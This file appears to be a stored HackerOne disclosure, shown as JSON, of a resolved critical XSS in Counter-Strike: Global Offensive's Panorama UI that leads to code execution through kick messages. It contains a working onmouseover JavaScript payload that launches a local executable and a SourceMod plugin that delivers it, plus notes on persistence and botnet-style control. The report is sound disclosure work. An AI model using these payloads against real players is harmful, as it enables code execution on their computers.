@@ -1,0 +1,221 @@
+{
+  "id": 631956,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzE5NTY=",
+  "url": "https://hackerone.com/reports/631956",
+  "title": "Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-06-29T07:04:48.145Z",
+  "submitted_at": "2019-06-29T07:04:48.145Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "shayhelman",
+    "url": "/shayhelman",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/S5BZv1rHnPFQcZTvAdbGotZt/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23363,
+    "url": "https://hackerone.com/valve",
+    "handle": "valve",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Valve",
+      "twitter_handle": "",
+      "website": "https://www.valvesoftware.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-10-08T22:10:26.401Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-09-04T23:27:09.659Z",
+  "team_member_agreed_on_going_public_at": "2019-10-08T22:10:26.289Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Overview\nCounter-Strike: Global Offensive's UI is built of a framework called [Panorama](https://developer.valvesoftware.com/wiki/Dota_2_Workshop_Tools/Panorama) which is heavily influenced by modern HTML/CSS with JS capabilities. Because of these properties, the UI becomes easily vulnerable to different types of code injection, most notably XSS.\n\nPreviously, it was discovered that a certain message-type sent through the lobby chat allowed anyone to send raw HTML strings that would then be parsed by the Panorama framework as valid HTML. The reason this XSS was possible was because of a certain Panorama tag that was left enabled.\n\nIn order to see how these Panorama files are constructed, you must extract them from the CS:GO files. By unzipping the file under `steamapps\\common\\Counter-Strike Global Offensive\\csgo\\panorama\\code.pbin`, a plethora of UI files are revealed. In these files we can see how this lobby XSS was possible by looking in the file named `panorama\\layout\\chat.xml` on line `18` we can see \n```\n<Label html=\"true\" text=\"&lt;span class='chat-entry__name'&gt;{s:player_name}&lt;/span&gt; {s:msg}\" acceptsinput=\"true\" />\n```\n\nBy having `html=\"true\"` in a Panorama tag, any input is parsed as raw HTML. This is what lead to the discovery of this exploit. We grepped through all the Panorama layout files looking for any that contained `html=\"true\"` and within a few seconds we found a particular file with the name `panorama\\layout\\popups\\popup_generic.xml`. We knew that the disconnect message was utilizing this exact file which is when we started to test.\n\nOur first payload was testing if an image could load via a custom disconnect message. So we tried a simple payload `disconnect \"<img src='https://i.imgur.com/IbJKM0M.jpg'>\"`, and after running it twice (for caching purposes), the cat appeared to our surprise. {F518974}\n\nNow that we knew disconnect popups were exploitable, we tried to see if this could be done remotely through the kick function. We tested first on local servers with the `kickid` command but had no luck. We then setup a dedicated server with SourceMod and attemped to kick with `sm_kick`. This worked at first but it had a character limit which did not allow much room for meaningful payloads. After reading through SourceMod documentation, we found a function called ` KickClient()` which did not have a character limit. After testing with some common payloads, we concluded that `<a onmouseover='javascript:CODE'></a>` is the best method with the least amount of user interaction to trigger code execution since the Panorama HTML parser is very limited in the amount of working tags and event listeners which is highlighted [here](https://developer.valvesoftware.com/wiki/Dota_2_Workshop_Tools/Panorama#.JS_.28Javascript.29).\n\n## Steps to reproduce\n\n* Setup a [dedicated CS:GO server](https://developer.valvesoftware.com/wiki/Counter-Strike:_Global_Offensive_Dedicated_Servers)\n* Install [SourceMod](https://wiki.alliedmods.net/Installing_sourcemod) and [Metamod](https://www.sourcemm.net/)\n* Download the attached SourceMod plugin and place it under `\\addons\\sourcemod\\plugins\\`: F518946\n* Start up CS:GO and connect to the server\n* Run this string in your client's console:\n```\nsm_testkick <a onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">The remote host stopped receiving communications and closed the connection</a>\n```\n\n* Mouse over the text `The remote host stopped receiving communications and closed the connection.`\n\n## PoC\n\n{F518945}\nTriggered with the command:\n```\nsm_testkick <a onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">The remote host stopped receiving communications and closed the connection</a>\n```\n\n### SourceMod Kick Plugin Source F518946\n\n```cpp\n#include <sourcemod>\n\n#pragma semicolon 1\n#pragma newdecls required\n\npublic void OnPluginStart()\n{\n    RegConsoleCmd(\"sm_testkick\", Cmd_Kick);\n}\n\npublic Action Cmd_Kick(int client, int args)\n{\n    if (args <= 0) {\n        PrintToChat(client, \"No arguments provided - Usage: !testkick <Kick Message>\");\n        return Plugin_Handled;\n    }\n\n    char full[5120];\n    GetCmdArgString(full, sizeof(full));\n\n    for (int i = 0; i < 5; i++) {\n        KickClient(client, full);\n    }\n\n    return Plugin_Handled;\n}\n```\n\n## Impact\n\nAn attacker could achieve full system access to the victims computer. A dummy server can be setup with an autokick message containing the payload. The victim would just need to join the attackers server and they would become infected. Moreover, an attacker could trick a server owner into installing a malicious SourceMod plugin that would be able to deliver the malicious payload to anyone on the server.\n\nSimilar to #470520, the exploit can be triggered via browser by connecting the victim to an attacker controlled server.\n\nThis exploit could also be combined with any Panorama function present [here](https://developer.valvesoftware.com/wiki/CSGO_Panorama_API) in order to further mess with the game's functionality (such as starting and accepting a new match or displaying a custom popup message). The attacker virtually has full control over all UI features.\n\nEven though the payload is only triggered via the `mouseover` event, because the way the message appears in the center of the victim's screen and the ability to fill the center of the screen with exploitable text, user interaction is negligible.\n\nIt is also possible to persist the Javascript code execution by hoisting a function to the scheduler. Eg. `$.Schedule(1, function)`. Furthermore, it is possible to set up a persistent remote connection to the victim's game instance by utilizing `eval()` and `$.AsyncWebRequest()` which would allow the attacker to manage multiple victims in some sort of botnet.\n\nYours respectfully,\nShay @shayhelman and Felix @dukebruno123",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 518945,
+      "file_name": "cIvlT8vHqy.gif",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/518/945/765f0cd0b504bf1afce6a5b6a239e20ed8823130/cIvlT8vHqy.gif?response-content-disposition=attachment%3B%20filename%3D%22cIvlT8vHqy.gif%22%3B%20filename%2A%3DUTF-8%27%27cIvlT8vHqy.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYRLUE5WS%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T052538Z&X-Amz-Expires=785&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCoUkkakIp5MJBwh26PzpMrDHa7cG18XxdZs4iCR11B%2FAIgImlDc2%2FZPVmeUHZSiQEfdCAL%2Foi8dF1aIo1OfPLrJRcqsgUIeBADGgwwMTM2MTkyNzQ4NDkiDKIQRs5xGJY%2F4fx2jiqPBV2mJ1%2FCPppTUhIFX8clMjbsP9xa3IX7zZNcv8Ib3pngoIPiuMe%2FwMSakXXl043rJPqdK5ix12yP76AMzx4jbidLveCtA2wJWK8FVBKmK8JJT1LuD768MDT6G1%2BBsf0rccJ1w78RdX1uBT27Vi5GUG6nmSYjTGf4oXX%2FtoCMjLTvSB%2FaqhrtcmlHwSzUK3JJXLMO1hhT%2FB6eUhyxHYYLaRigDztqtpw5QOXoXJni7dZI9zYyQtP7AHBuBf4IsrJXmWGUrY5HTmxcLulkklgE8m1VADQNEqsrSFp6mnNiXwPJNjH0uA%2FGaUhCMZw8iZ9r81HSIVBX8GqX97qdtuvFcraBtdkSJhJb5IUVTRdJetgpvRH1u9rqF9QPVUUXyZUIzk6ZfQvMCLDbohcmIkuZGu%2BmLs%2Bec5xtm4ADxfbAl5Nb4KQqXEJYBM9di%2B%2Biz8MQ%2FlrR8IiROX5VhNlM%2B6RTu9qSrlWVQnDpjVFvsWviA7tOo51TCIl0KTsmBBBhkm71OuqBv8rHi26pXRliSyOznPk%2BlgDVTKEHFve9NtVQNyJqBcf8z%2Bg0fbJp2j1pwbjY1SLRw%2BqdZwgAIyJGYiDyCaqiFFKrU%2BtrtF55WckPlII2hZU85KWKtRUk%2FBt74V6W9Dr%2FB2V%2FvIIJ0MGTOR7bOGD59jPXKF1mVqcmTTJOL12SPPBaghCxUoNM2CXTWSm3jAGLv3vMDKbFm456MiHktC%2BJy0MUzasI8yFpd3IUAP61f2fpxqGJpxzAKYAEJUXInsfnzXK3a1nW4WyS96YkuW0RP%2BJ4W3yF9wsJrZyUEkM1mWmLERmHYmsHELEH9Ei%2Fjh1%2FYl%2BdujTbN%2F4fIA%2FW9EY8k3%2BRhiuhZPiORlONApkwwpC20gY6sQHSlDLQ9j436u20fc9U9bRNhqXF5aiBFwkrksJpJ%2Fzr55%2BcyCZFiMwPfNY8bEbSHvpr%2BgeLYA%2Bi7uYHbMFxosLdpoE2jb0ymEAvICMaKnERciOYVHCqZeESf2fxhSeCil%2BwCXrF5m9rq4%2B9RA8aVE64lt1ypjekZfaPrDWURHn4L6%2F2H9oOElMZAQMTtdkCbKZ79TDBa%2BJS02whNtVTSVorpZtaXR7B3MPCTyLJO0OY1cw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8d8b0360bfb0c2a532e2221f695f4a5908784dd5a51e4c8487260c8ac86a0387",
+      "file_size": 24568279,
+      "type": "image/gif",
+      "moderated": null
+    },
+    {
+      "id": 518946,
+      "file_name": "testkick.smx",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/518/946/e2ec09ffe25d51abb5e68d537fcdf388f17ee0fd/testkick.smx?response-content-disposition=attachment%3B%20filename%3D%22testkick.smx%22%3B%20filename%2A%3DUTF-8%27%27testkick.smx&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYRLUE5WS%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T052538Z&X-Amz-Expires=785&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCoUkkakIp5MJBwh26PzpMrDHa7cG18XxdZs4iCR11B%2FAIgImlDc2%2FZPVmeUHZSiQEfdCAL%2Foi8dF1aIo1OfPLrJRcqsgUIeBADGgwwMTM2MTkyNzQ4NDkiDKIQRs5xGJY%2F4fx2jiqPBV2mJ1%2FCPppTUhIFX8clMjbsP9xa3IX7zZNcv8Ib3pngoIPiuMe%2FwMSakXXl043rJPqdK5ix12yP76AMzx4jbidLveCtA2wJWK8FVBKmK8JJT1LuD768MDT6G1%2BBsf0rccJ1w78RdX1uBT27Vi5GUG6nmSYjTGf4oXX%2FtoCMjLTvSB%2FaqhrtcmlHwSzUK3JJXLMO1hhT%2FB6eUhyxHYYLaRigDztqtpw5QOXoXJni7dZI9zYyQtP7AHBuBf4IsrJXmWGUrY5HTmxcLulkklgE8m1VADQNEqsrSFp6mnNiXwPJNjH0uA%2FGaUhCMZw8iZ9r81HSIVBX8GqX97qdtuvFcraBtdkSJhJb5IUVTRdJetgpvRH1u9rqF9QPVUUXyZUIzk6ZfQvMCLDbohcmIkuZGu%2BmLs%2Bec5xtm4ADxfbAl5Nb4KQqXEJYBM9di%2B%2Biz8MQ%2FlrR8IiROX5VhNlM%2B6RTu9qSrlWVQnDpjVFvsWviA7tOo51TCIl0KTsmBBBhkm71OuqBv8rHi26pXRliSyOznPk%2BlgDVTKEHFve9NtVQNyJqBcf8z%2Bg0fbJp2j1pwbjY1SLRw%2BqdZwgAIyJGYiDyCaqiFFKrU%2BtrtF55WckPlII2hZU85KWKtRUk%2FBt74V6W9Dr%2FB2V%2FvIIJ0MGTOR7bOGD59jPXKF1mVqcmTTJOL12SPPBaghCxUoNM2CXTWSm3jAGLv3vMDKbFm456MiHktC%2BJy0MUzasI8yFpd3IUAP61f2fpxqGJpxzAKYAEJUXInsfnzXK3a1nW4WyS96YkuW0RP%2BJ4W3yF9wsJrZyUEkM1mWmLERmHYmsHELEH9Ei%2Fjh1%2FYl%2BdujTbN%2F4fIA%2FW9EY8k3%2BRhiuhZPiORlONApkwwpC20gY6sQHSlDLQ9j436u20fc9U9bRNhqXF5aiBFwkrksJpJ%2Fzr55%2BcyCZFiMwPfNY8bEbSHvpr%2BgeLYA%2Bi7uYHbMFxosLdpoE2jb0ymEAvICMaKnERciOYVHCqZeESf2fxhSeCil%2BwCXrF5m9rq4%2B9RA8aVE64lt1ypjekZfaPrDWURHn4L6%2F2H9oOElMZAQMTtdkCbKZ79TDBa%2BJS02whNtVTSVorpZtaXR7B3MPCTyLJO0OY1cw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bef8f2b087d9978050c47eb68846d67171af52b85ed7726e920c1eb551896fcb",
+      "file_size": 3819,
+      "type": "application/octet-stream",
+      "moderated": null
+    },
+    {
+      "id": 518974,
+      "file_name": "cat.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/518/974/741770e22b299fe8e1b7c61ef8b25f9a31c96e8d/cat.png?response-content-disposition=attachment%3B%20filename%3D%22cat.png%22%3B%20filename%2A%3DUTF-8%27%27cat.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYRLUE5WS%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T052538Z&X-Amz-Expires=785&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCoUkkakIp5MJBwh26PzpMrDHa7cG18XxdZs4iCR11B%2FAIgImlDc2%2FZPVmeUHZSiQEfdCAL%2Foi8dF1aIo1OfPLrJRcqsgUIeBADGgwwMTM2MTkyNzQ4NDkiDKIQRs5xGJY%2F4fx2jiqPBV2mJ1%2FCPppTUhIFX8clMjbsP9xa3IX7zZNcv8Ib3pngoIPiuMe%2FwMSakXXl043rJPqdK5ix12yP76AMzx4jbidLveCtA2wJWK8FVBKmK8JJT1LuD768MDT6G1%2BBsf0rccJ1w78RdX1uBT27Vi5GUG6nmSYjTGf4oXX%2FtoCMjLTvSB%2FaqhrtcmlHwSzUK3JJXLMO1hhT%2FB6eUhyxHYYLaRigDztqtpw5QOXoXJni7dZI9zYyQtP7AHBuBf4IsrJXmWGUrY5HTmxcLulkklgE8m1VADQNEqsrSFp6mnNiXwPJNjH0uA%2FGaUhCMZw8iZ9r81HSIVBX8GqX97qdtuvFcraBtdkSJhJb5IUVTRdJetgpvRH1u9rqF9QPVUUXyZUIzk6ZfQvMCLDbohcmIkuZGu%2BmLs%2Bec5xtm4ADxfbAl5Nb4KQqXEJYBM9di%2B%2Biz8MQ%2FlrR8IiROX5VhNlM%2B6RTu9qSrlWVQnDpjVFvsWviA7tOo51TCIl0KTsmBBBhkm71OuqBv8rHi26pXRliSyOznPk%2BlgDVTKEHFve9NtVQNyJqBcf8z%2Bg0fbJp2j1pwbjY1SLRw%2BqdZwgAIyJGYiDyCaqiFFKrU%2BtrtF55WckPlII2hZU85KWKtRUk%2FBt74V6W9Dr%2FB2V%2FvIIJ0MGTOR7bOGD59jPXKF1mVqcmTTJOL12SPPBaghCxUoNM2CXTWSm3jAGLv3vMDKbFm456MiHktC%2BJy0MUzasI8yFpd3IUAP61f2fpxqGJpxzAKYAEJUXInsfnzXK3a1nW4WyS96YkuW0RP%2BJ4W3yF9wsJrZyUEkM1mWmLERmHYmsHELEH9Ei%2Fjh1%2FYl%2BdujTbN%2F4fIA%2FW9EY8k3%2BRhiuhZPiORlONApkwwpC20gY6sQHSlDLQ9j436u20fc9U9bRNhqXF5aiBFwkrksJpJ%2Fzr55%2BcyCZFiMwPfNY8bEbSHvpr%2BgeLYA%2Bi7uYHbMFxosLdpoE2jb0ymEAvICMaKnERciOYVHCqZeESf2fxhSeCil%2BwCXrF5m9rq4%2B9RA8aVE64lt1ypjekZfaPrDWURHn4L6%2F2H9oOElMZAQMTtdkCbKZ79TDBa%2BJS02whNtVTSVorpZtaXR7B3MPCTyLJO0OY1cw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5aae0665b15c298c0d9fc6b9f97cb82583b32ddfa3dda2ad27725575327ef8e5",
+      "file_size": 2207899,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 417,
+  "voters": [
+    "jbreed",
+    "nekz",
+    "hexpwn",
+    "primeministerofcats",
+    "act1on3",
+    "googlelai",
+    "orange303",
+    "akr3ch",
+    "arif_y",
+    "irek",
+    "and 407 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 1286,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "csgo.exe",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "631956",
+  "votes": 417,
+  "latest_disclosable_activity_at": "2019-10-08T22:10:26.425Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:25:38.501222",
+    "source": "https://hackerone.com/reports/631956.json",
+    "report_id": 631956
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzE5NTY=",
+    "databaseId": "631956",
+    "title": "Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message",
+    "url": "https://hackerone.com/reports/631956",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2019-10-08T22:10:26.401Z",
+    "created_at": "2019-06-29T07:04:48.145Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzcw",
+      "name": "Code Injection",
+      "external_id": "cwe-94"
+    },
+    "severity": {
+      "rating": "critical",
+      "score": null
+    },
+    "reporter": {
+      "username": "shayhelman"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzMzYz",
+      "handle": "valve",
+      "name": "Valve",
+      "url": "https://hackerone.com/valve",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8xNTY3NzY=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2019-09-04T23:11:53.092Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzYzMTk1Ng==",
+    "_id": "631956",
+    "disclosed": true,
+    "votes": 417,
+    "latest_disclosable_activity_at": "2019-10-08T22:10:26.425Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzE5NTY=",
+      "databaseId": "631956",
+      "title": "Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message",
+      "url": "https://hackerone.com/reports/631956",
+      "disclosed_at": "2019-10-08T22:10:26.401Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzMzYz",
+      "handle": "valve",
+      "name": "Valve",
+      "url": "https://hackerone.com/valve",
+      "currency": "usd"
+    }
+  }
+}
